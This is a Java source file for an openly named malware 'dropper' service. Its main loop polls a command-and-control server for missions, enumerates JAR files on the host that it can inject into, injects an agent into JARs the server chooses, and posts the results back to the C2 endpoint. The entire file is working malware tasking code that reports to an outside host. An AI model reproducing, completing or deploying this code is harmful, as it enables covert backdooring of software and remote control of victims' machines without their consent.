package dropper.services;

import com.google.gson.Gson;
import dropper.entities.Agent;
import dropper.entities.Mission;
import dropper.injector.JarInjector;

import java.io.IOException;

import static dropper.utils.HttpUtil.sendGET;
import static dropper.utils.HttpUtil.sendPOST;

public class DropperBackgroundService {
    private final static Gson gson = new Gson();
    private JarInjector injector;

    public DropperBackgroundService() {
        injector = new JarInjector();
    }

    public void listen(String c2Url, Agent agent) {
        String response;
        while (true) {
            try {
                response = sendGET(c2Url + "/nextMission?agentId=1");
                Mission currentMission = gson.fromJson(response, Mission.class);

                String artifact = "no matching action";
                if (currentMission.getType() == 1) {
                    artifact = gson.toJson(injector.getInjectableJars());
                }
                if (currentMission.getType() == 2) {
                    artifact = gson.toJson(injector.injectAgentToJar(currentMission.getAgrs()[0], currentMission.getAgrs()[1]));
                }

                sendPOST(c2Url + "/saveArtifact", artifact);

            } catch (IOException e) {
                // no mission
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
            }
        }
    }
}
